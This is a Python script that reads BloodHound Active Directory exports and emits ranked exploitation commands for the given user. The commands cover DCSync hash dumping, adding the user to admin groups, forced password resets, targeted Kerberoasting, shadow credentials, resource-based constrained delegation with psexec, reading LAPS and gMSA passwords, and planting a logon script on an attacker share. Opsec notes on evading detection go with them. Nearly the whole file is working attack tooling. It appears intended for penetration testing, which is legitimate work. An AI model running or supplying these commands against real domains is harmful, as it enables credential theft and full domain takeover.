#!/usr/bin/env python3
"""
BloodHound → BloodyAD Automation Script - COMPLETE VERSION
Covers ALL abuse primitives: GenericAll, WriteDACL, WriteOwner, ForceChangePassword,
AddKeyCredentialLink, WriteSPN, ReadLAPSPassword, ReadGMSAPassword, etc.

Author: Complete AD Abuse Primitive Coverage
"""

import json
import sys
import os
from pathlib import Path
from collections import defaultdict
import zipfile

class BloodHoundParser:
    def __init__(self, bh_zip_path, domain, username, dc_ip):
        self.bh_zip_path = bh_zip_path
        self.domain = domain
        self.username = username
        self.dc_ip = dc_ip
        self.users = []
        self.computers = []
        self.groups = []
        self.domains = []
        self.ous = []
        self.gpos = []
        self.exploitation_commands = []
        
        # Track which rights enable which attacks
        self.OWNERSHIP_RIGHTS = ['Owns', 'WriteOwner', 'GenericAll']
        self.DACL_RIGHTS = ['WriteDacl', 'GenericAll']
        self.WRITE_RIGHTS = ['GenericWrite', 'GenericAll']
        self.MEMBER_RIGHTS = ['GenericAll', 'WriteOwner', 'WriteDacl']
        
    def extract_and_parse(self):
        """Extract BloodHound ZIP and parse all JSON files"""
        try:
            with zipfile.ZipFile(self.bh_zip_path, 'r') as zip_ref:
                temp_dir = Path('/tmp/bh_extraction')
                temp_dir.mkdir(exist_ok=True)
                zip_ref.extractall(temp_dir)
                
                for json_file in temp_dir.glob('*.json'):
                    try:
                        with open(json_file, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            filename = json_file.name.lower()
                            
                            if 'users' in filename or 'user' in filename:
                                users_data = data.get('data', []) or data.get('users', [])
                                self.users.extend(users_data)
                                print(f"[+] Parsed {len(users_data)} users", file=sys.stderr)
                                
                            elif 'computers' in filename or 'computer' in filename:
                                computers_data = data.get('data', []) or data.get('computers', [])
                                self.computers.extend(computers_data)
                                print(f"[+] Parsed {len(computers_data)} computers", file=sys.stderr)
                                
                            elif 'groups' in filename or 'group' in filename:
                                groups_data = data.get('data', []) or data.get('groups', [])
                                self.groups.extend(groups_data)
                                print(f"[+] Parsed {len(groups_data)} groups", file=sys.stderr)
                                
                            elif 'domains' in filename or 'domain' in filename:
                                domains_data = data.get('data', []) or data.get('domains', [])
                                self.domains.extend(domains_data)
                                print(f"[+] Parsed {len(domains_data)} domains", file=sys.stderr)
                                
                            elif 'ous' in filename or 'ou' in filename:
                                ous_data = data.get('data', []) or data.get('ous', [])
                                self.ous.extend(ous_data)
                                print(f"[+] Parsed {len(ous_data)} OUs", file=sys.stderr)
                                
                            elif 'gpos' in filename or 'gpo' in filename:
                                gpos_data = data.get('data', []) or data.get('gpos', [])
                                self.gpos.extend(gpos_data)
                                print(f"[+] Parsed {len(gpos_data)} GPOs", file=sys.stderr)
                                
                    except Exception as e:
                        print(f"[-] Error parsing {json_file.name}: {e}", file=sys.stderr)
                
                return True
        except Exception as e:
            print(f"[-] Error: {e}", file=sys.stderr)
            return False
    
    def normalize_name(self, name):
        """Normalize account names"""
        if not name:
            return ""
        return name.upper().strip()
    
    def is_current_user(self, principal_name):
        """Check if principal is the current user"""
        principal_norm = self.normalize_name(principal_name)
        username_norm = self.normalize_name(self.username)
        full_norm = self.normalize_name(f"{self.username}@{self.domain}")
        
        return (username_norm in principal_norm or 
                principal_norm == full_norm or
                principal_norm.startswith(username_norm + "@"))
    
    def generate_bloodyad_commands(self):
        """Generate ALL possible BloodyAD exploitation commands"""
        commands = []
        
        print(f"[*] Analyzing attack paths for: {self.username}@{self.domain}", file=sys.stderr)
        
        # ============================================================
        # 1. DOMAIN OBJECT ATTACKS
        # ============================================================
        commands.extend(self._analyze_domain_attacks())
        
        # ============================================================
        # 2. GROUP ATTACKS (Most Common)
        # ============================================================
        commands.extend(self._analyze_group_attacks())
        
        # ============================================================
        # 3. USER ATTACKS
        # ============================================================
        commands.extend(self._analyze_user_attacks())
        
        # ============================================================
        # 4. COMPUTER ATTACKS
        # ============================================================
        commands.extend(self._analyze_computer_attacks())
        
        # ============================================================
        # 5. OU ATTACKS (GPO abuse)
        # ============================================================
        commands.extend(self._analyze_ou_attacks())
        
        # ============================================================
        # 6. GPO ATTACKS
        # ============================================================
        commands.extend(self._analyze_gpo_attacks())
        
        # Sort by priority
        priority_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        commands.sort(key=lambda x: priority_order.get(x['priority'], 999))
        
        print(f"[+] Generated {len(commands)} exploitation commands", file=sys.stderr)
        return commands
    
    def _analyze_domain_attacks(self):
        """Analyze Domain object for privilege escalation"""
        commands = []
        
        for domain in self.domains:
            props = domain.get('Properties', {})
            domain_name = props.get('name', '')
            
            for ace in domain.get('Aces', []):
                principal = ace.get('PrincipalName', '')
                right = ace.get('RightName', '')
                
                if not self.is_current_user(principal):
                    continue
                
                # WriteDacl or GenericAll → DCSync
                if right in self.DACL_RIGHTS:
                    commands.append({
                        'priority': 'CRITICAL',
                        'type': 'DCSync',
                        'description': f'{right} on Domain → Grant DCSync and dump all hashes',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add dcsync '{self.username}'",
                        'follow_up': f"impacket-secretsdump '{self.domain}/{self.username}:PASSWORD@{self.dc_ip}'",
                        'impact': 'DUMP ALL DOMAIN HASHES (NTLM + Kerberos)',
                        'prerequisites': f'{right} on Domain',
                        'opsec': 'MEDIUM - Event 4662 (DS Access)'
                    })
                
                # WriteOwner → Take ownership of domain
                elif right == 'WriteOwner':
                    commands.append({
                        'priority': 'CRITICAL',
                        'type': 'DomainOwnership',
                        'description': 'WriteOwner on Domain → Take ownership → WriteDacl → DCSync',
                        'command': f"# Step 1: Take ownership\n" +
                                  f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set owner 'DC={self.domain.split('.')[0]},DC={self.domain.split('.')[1]}' '{self.username}'\n\n" +
                                  f"# Step 2: Grant yourself WriteDacl\n" +
                                  f"bloodyAD add genericAll 'DC=...' '{self.username}'\n\n" +
                                  f"# Step 3: DCSync\n" +
                                  f"bloodyAD add dcsync '{self.username}'",
                        'impact': 'FULL DOMAIN CONTROL',
                        'prerequisites': 'WriteOwner on Domain',
                        'opsec': 'HIGH - Ownership change Event 4670'
                    })
        
        return commands
    
    def _analyze_group_attacks(self):
        """Analyze Groups for membership abuse"""
        commands = []
        
        for group in self.groups:
            props = group.get('Properties', {})
            group_name = props.get('name', '')
            
            if not group_name:
                continue
            
            # Determine priority based on group name
            priority = 'MEDIUM'
            if 'DOMAIN ADMINS' in group_name.upper():
                priority = 'CRITICAL'
            elif 'ENTERPRISE ADMINS' in group_name.upper() or 'SCHEMA ADMINS' in group_name.upper():
                priority = 'CRITICAL'
            elif 'ADMIN' in group_name.upper():
                priority = 'HIGH'
            
            for ace in group.get('Aces', []):
                principal = ace.get('PrincipalName', '')
                right = ace.get('RightName', '')
                
                if not self.is_current_user(principal):
                    continue
                
                # GenericAll / WriteDacl / WriteOwner → Add member
                if right in self.MEMBER_RIGHTS:
                    commands.append({
                        'priority': priority,
                        'type': 'AddMember',
                        'description': f'{right} on {group_name} → Add yourself to group',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember '{group_name}' '{self.username}'",
                        'impact': f'MEMBERSHIP IN {group_name}',
                        'prerequisites': f'{right} on group',
                        'opsec': 'HIGH - Event 4728/4732 (member added)'
                    })
                
                # AddSelf
                elif right == 'AddSelf':
                    commands.append({
                        'priority': priority,
                        'type': 'AddSelf',
                        'description': f'AddSelf on {group_name}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember '{group_name}' '{self.username}'",
                        'impact': f'MEMBERSHIP IN {group_name}',
                        'prerequisites': 'AddSelf permission',
                        'opsec': 'MEDIUM - Event 4728'
                    })
                
                # AllExtendedRights (includes AddMember)
                elif right == 'AllExtendedRights':
                    commands.append({
                        'priority': priority,
                        'type': 'AddMember',
                        'description': f'AllExtendedRights on {group_name} → Add member',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember '{group_name}' '{self.username}'",
                        'impact': f'MEMBERSHIP IN {group_name}',
                        'prerequisites': 'AllExtendedRights',
                        'opsec': 'HIGH - Event 4728'
                    })
        
        return commands
    
    def _analyze_user_attacks(self):
        """Analyze Users for password/credential abuse"""
        commands = []
        
        for user in self.users:
            props = user.get('Properties', {})
            target = props.get('samaccountname', '')
            enabled = props.get('enabled', True)
            is_admin = props.get('admincount', False)
            has_spn = props.get('hasspn', False)
            
            if not target or not enabled:
                continue
            
            priority = 'HIGH' if is_admin else 'MEDIUM'
            
            for ace in user.get('Aces', []):
                principal = ace.get('PrincipalName', '')
                right = ace.get('RightName', '')
                
                if not self.is_current_user(principal):
                    continue
                
                # ForceChangePassword
                if right == 'ForceChangePassword':
                    commands.append({
                        'priority': priority,
                        'type': 'PasswordReset',
                        'description': f'ForceChangePassword on {"PRIVILEGED " if is_admin else ""}user: {target}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password '{target}' 'NewP@ssw0rd123!'",
                        'follow_up': f"Use {target}:NewP@ssw0rd123! for access",
                        'impact': f'COMPROMISE {"PRIVILEGED " if is_admin else ""}ACCOUNT',
                        'prerequisites': 'ForceChangePassword',
                        'opsec': 'HIGH - Event 4724 (password reset)'
                    })
                
                # GenericAll → Multiple options
                elif right == 'GenericAll':
                    # Option 1: Reset password
                    commands.append({
                        'priority': priority,
                        'type': 'PasswordReset',
                        'description': f'GenericAll on {target} → Reset password',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password '{target}' 'NewP@ss123!'",
                        'impact': f'COMPROMISE ACCOUNT',
                        'prerequisites': 'GenericAll',
                        'opsec': 'HIGH - Event 4724'
                    })
                    
                    # Option 2: Set SPN if no SPN exists
                    if not has_spn:
                        commands.append({
                            'priority': priority,
                            'type': 'TargetedKerberoast',
                            'description': f'GenericAll on {target} → Add SPN → Kerberoast',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName '{target}' 'HTTP/fake.{self.domain}'",
                            'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -request-user {target} && hashcat -m 13100",
                            'impact': 'CRACK PASSWORD OFFLINE',
                            'prerequisites': 'GenericAll',
                            'opsec': 'MEDIUM - SPN change logged'
                        })
                    
                    # Option 3: Shadow Credentials (AddKeyCredentialLink)
                    commands.append({
                        'priority': priority,
                        'type': 'ShadowCredentials',
                        'description': f'GenericAll on {target} → Shadow Credentials attack',
                        'command': f"# Requires pywhisker tool\n" +
                                  f"python3 pywhisker.py -d {self.domain} -u {self.username} -p 'PASSWORD' --target '{target}' --action add",
                        'follow_up': "Use generated certificate to authenticate as target",
                        'impact': 'AUTHENTICATE AS TARGET (stealthy)',
                        'prerequisites': 'GenericAll + pywhisker',
                        'opsec': 'LOW - very stealthy attack'
                    })
                
                # GenericWrite / WriteProperty
                elif right in ['GenericWrite', 'WriteProperty']:
                    # Add SPN for Kerberoasting
                    if not has_spn:
                        commands.append({
                            'priority': priority,
                            'type': 'TargetedKerberoast',
                            'description': f'{right} on {target} → Set SPN → Kerberoast',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName '{target}' 'HTTP/fake.{self.domain}'",
                            'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -request-user {target}",
                            'impact': 'TARGETED KERBEROAST',
                            'prerequisites': f'{right}',
                            'opsec': 'MEDIUM - SPN modification logged'
                        })
                    
                    # Set script path for execution
                    commands.append({
                        'priority': priority,
                        'type': 'ScriptPath',
                        'description': f'{right} on {target} → Set malicious logon script',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set object '{target}' scriptPath '\\\\attacker\\share\\evil.bat'",
                        'follow_up': "Wait for user to logon",
                        'impact': 'CODE EXECUTION AS TARGET USER',
                        'prerequisites': f'{right} + SMB share',
                        'opsec': 'LOW-MEDIUM'
                    })
                
                # WriteSPN specifically
                elif right == 'WriteSPN':
                    commands.append({
                        'priority': priority,
                        'type': 'TargetedKerberoast',
                        'description': f'WriteSPN on {target} → Targeted Kerberoasting',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName '{target}' 'HTTP/{target}.{self.domain}'",
                        'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -request-user {target}",
                        'impact': 'KERBEROAST SPECIFIC USER',
                        'prerequisites': 'WriteSPN',
                        'opsec': 'MEDIUM'
                    })
                
                # AddKeyCredentialLink (Shadow Credentials)
                elif right == 'AddKeyCredentialLink':
                    commands.append({
                        'priority': priority,
                        'type': 'ShadowCredentials',
                        'description': f'AddKeyCredentialLink on {target} → Shadow Credentials',
                        'command': f"python3 pywhisker.py -d {self.domain} -u {self.username} -p 'PASSWORD' --target '{target}' --action add",
                        'follow_up': "Authenticate using certificate",
                        'impact': 'STEALTHY AUTHENTICATION AS TARGET',
                        'prerequisites': 'AddKeyCredentialLink + pywhisker',
                        'opsec': 'LOW - very stealthy'
                    })
                
                # ReadLAPSPassword
                elif right == 'ReadLAPSPassword':
                    # This is actually for computers, but included here
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'ReadLAPS',
                        'description': f'ReadLAPSPassword on {target}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} get object '{target}' --attr ms-Mcs-AdmPwd",
                        'impact': 'READ LOCAL ADMIN PASSWORD',
                        'prerequisites': 'ReadLAPSPassword',
                        'opsec': 'LOW - reading attribute'
                    })
                
                # ReadGMSAPassword
                elif right == 'ReadGMSAPassword':
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'ReadGMSA',
                        'description': f'ReadGMSAPassword on {target}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} get object '{target}' --attr msDS-ManagedPassword",
                        'follow_up': "Decode password blob",
                        'impact': 'READ SERVICE ACCOUNT PASSWORD',
                        'prerequisites': 'ReadGMSAPassword',
                        'opsec': 'LOW'
                    })
                
                # WriteOwner
                elif right == 'WriteOwner':
                    commands.append({
                        'priority': priority,
                        'type': 'TakeOwnership',
                        'description': f'WriteOwner on {target} → Ownership → Full control',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set owner '{target}' '{self.username}'",
                        'follow_up': "Then reset password or modify attributes",
                        'impact': 'FULL CONTROL OF USER',
                        'prerequisites': 'WriteOwner',
                        'opsec': 'MEDIUM - Event 4670'
                    })
                
                # WriteDacl
                elif right == 'WriteDacl':
                    commands.append({
                        'priority': priority,
                        'type': 'WriteDACL',
                        'description': f'WriteDacl on {target} → Grant GenericAll → Full control',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add genericAll '{target}' '{self.username}'",
                        'follow_up': "Then reset password",
                        'impact': 'FULL CONTROL',
                        'prerequisites': 'WriteDacl',
                        'opsec': 'MEDIUM'
                    })
                
                # AllExtendedRights (includes ForceChangePassword)
                elif right == 'AllExtendedRights':
                    commands.append({
                        'priority': priority,
                        'type': 'PasswordReset',
                        'description': f'AllExtendedRights on {target} → Reset password',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password '{target}' 'NewPass123!'",
                        'impact': 'COMPROMISE ACCOUNT',
                        'prerequisites': 'AllExtendedRights',
                        'opsec': 'HIGH - Event 4724'
                    })
        
        return commands
    
    def _analyze_computer_attacks(self):
        """Analyze Computers for RBCD and other attacks"""
        commands = []
        
        for computer in self.computers:
            props = computer.get('Properties', {})
            comp_name = props.get('name', '')
            enabled = props.get('enabled', True)
            
            if not comp_name or not enabled:
                continue
            
            for ace in computer.get('Aces', []):
                principal = ace.get('PrincipalName', '')
                right = ace.get('RightName', '')
                
                if not self.is_current_user(principal):
                    continue
                
                # GenericAll / GenericWrite / WriteProperty → RBCD
                if right in ['GenericAll', 'GenericWrite', 'WriteProperty', 'WriteOwner', 'WriteDacl']:
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'RBCD',
                        'description': f'{right} on {comp_name} → Resource-Based Constrained Delegation',
                        'command': f"# Step 1: Create controlled computer\n" +
                                  f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add computer ATTACKER$ 'P@ssw0rd123!'\n\n" +
                                  f"# Step 2: Configure RBCD\n" +
                                  f"bloodyAD add rbcd '{comp_name}' 'ATTACKER$'\n\n" +
                                  f"# Step 3: Get service ticket as Administrator\n" +
                                  f"impacket-getST -spn cifs/{comp_name} -impersonate Administrator {self.domain}/ATTACKER$:P@ssw0rd123! -dc-ip {self.dc_ip}\n\n" +
                                  f"# Step 4: Use ticket\n" +
                                  f"export KRB5CCNAME=Administrator.ccache && psexec.py -k -no-pass {comp_name}",
                        'impact': 'IMPERSONATE ANY USER → LOCAL ADMIN',
                        'prerequisites': f'{right} + MachineAccountQuota > 0',
                        'opsec': 'LOW - stealthy attack'
                    })
                
                # ReadLAPSPassword
                if right in ['ReadLAPSPassword', 'GenericAll', 'AllExtendedRights']:
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'ReadLAPS',
                        'description': f'Read LAPS password on {comp_name}',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} get object '{comp_name}' --attr ms-Mcs-AdmPwd",
                        'follow_up': f"psexec.py Administrator:LAPS_PASSWORD@{comp_name}",
                        'impact': 'LOCAL ADMINISTRATOR ACCESS',
                        'prerequisites': 'ReadLAPSPassword',
                        'opsec': 'LOW'
                    })
        
        return commands
    
    def _analyze_ou_attacks(self):
        """Analyze OUs for GPO abuse"""
        commands = []
        
        for ou in self.ous:
            props = ou.get('Properties', {})
            ou_name = props.get('name', '')
            
            if not ou_name:
                continue
            
            for ace in ou.get('Aces', []):
                principal = ace.get('PrincipalName', '')
                right = ace.get('RightName', '')
                
                if not self.is_current_user(principal):
                    continue
                
                # GenericAll / WriteDacl / WriteProperty
                if right in ['GenericAll', 'WriteDacl', 'WriteProperty']:
                    commands.append({
                        'priority': 'MEDIUM',
                        'type': 'GPOAbuse',
                        'description': f'{right} on OU: {ou_name} → Link malicious GPO',
                        'command': f"# Create malicious GPO, then link it\n" +
                                  f"# Requires creating GPO first (manual in GPMC)",
                        'follow_up': "Computer/users in OU will apply GPO at next refresh",
                        'impact': 'CODE EXECUTION ON OU OBJECTS',
                        'prerequisites': f'{right} on OU',
                        'opsec': 'MEDIUM'
                    })
        
        return commands
    
    def _analyze_gpo_attacks(self):
        """Analyze GPOs for modification"""
        commands = []
        
        for gpo in self.gpos:
            props = gpo.get('Properties', {})
            gpo_name = props.get('name', '')
            
            if not gpo_name:
                continue
            
            for ace in gpo.get('Aces', []):
                principal = ace.get('PrincipalName', '')
                right = ace.get('RightName', '')
                
                if not self.is_current_user(principal):
                    continue
                
                # GenericAll / GenericWrite / WriteProperty
                if right in ['GenericAll', 'GenericWrite', 'WriteProperty', 'WriteOwner', 'WriteDacl']:
                    commands.append({
                        'priority': 'HIGH',
                        'type': 'GPOModification',
                        'description': f'{right} on GPO: {gpo_name} → Modify for code execution',
                        'command': f"# Use SharpGPOAbuse or manual editing\n" +
                                  f"# Add immediate scheduled task or startup script",
                        'follow_up': "Force GPO update: gpupdate /force",
                        'impact': 'CODE EXECUTION ON GPO-LINKED OBJECTS',
                        'prerequisites': f'{right} on GPO',
                        'opsec': 'MEDIUM-HIGH'
                    })
        
        return commands
    
    def output_json(self):
        """Output JSON results"""
        result = {
            'domain': self.domain,
            'username': self.username,
            'dc_ip': self.dc_ip,
            'stats': {
                'users': len(self.users),
                'computers': len(self.computers),
                'groups': len(self.groups),
                'domains': len(self.domains),
                'ous': len(self.ous),
                'gpos': len(self.gpos)
            },
            'exploitation_commands': self.exploitation_commands
        }
        
        print(json.dumps(result, indent=2))

def main():
    if len(sys.argv) < 5:
        print("Usage: bloodhound_parser.py <bh_zip> <domain> <username> <dc_ip>", file=sys.stderr)
        sys.exit(1)
    
    bh_zip = sys.argv[1]
    domain = sys.argv[2]
    username = sys.argv[3]
    dc_ip = sys.argv[4]
    
    if not os.path.exists(bh_zip):
        print(f"[-] Error: BloodHound ZIP not found: {bh_zip}", file=sys.stderr)
        sys.exit(1)
    
    parser = BloodHoundParser(bh_zip, domain, username, dc_ip)
    
    print("[*] Parsing BloodHound data...", file=sys.stderr)
    if not parser.extract_and_parse():
        sys.exit(1)
    
    print(f"[+] Parsed {len(parser.users)} users, {len(parser.computers)} computers, " + 
          f"{len(parser.groups)} groups, {len(parser.domains)} domains", file=sys.stderr)
    
    print("[*] Analyzing ALL abuse primitives...", file=sys.stderr)
    parser.exploitation_commands = parser.generate_bloodyad_commands()
    
    if len(parser.exploitation_commands) == 0:
        print("[-] No direct attack paths found from current user", file=sys.stderr)
        print("[!] Try lateral movement or check BloodHound GUI for complex paths", file=sys.stderr)
    else:
        # Show summary by type
        by_priority = {}
        for cmd in parser.exploitation_commands:
            priority = cmd['priority']
            by_priority[priority] = by_priority.get(priority, 0) + 1
        
        print(f"\n[+] Attack Path Summary:", file=sys.stderr)
        for priority in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if priority in by_priority:
                print(f"    {priority}: {by_priority[priority]}", file=sys.stderr)
    
    # Output JSON for bash
    parser.output_json()

if __name__ == "__main__":
    main()
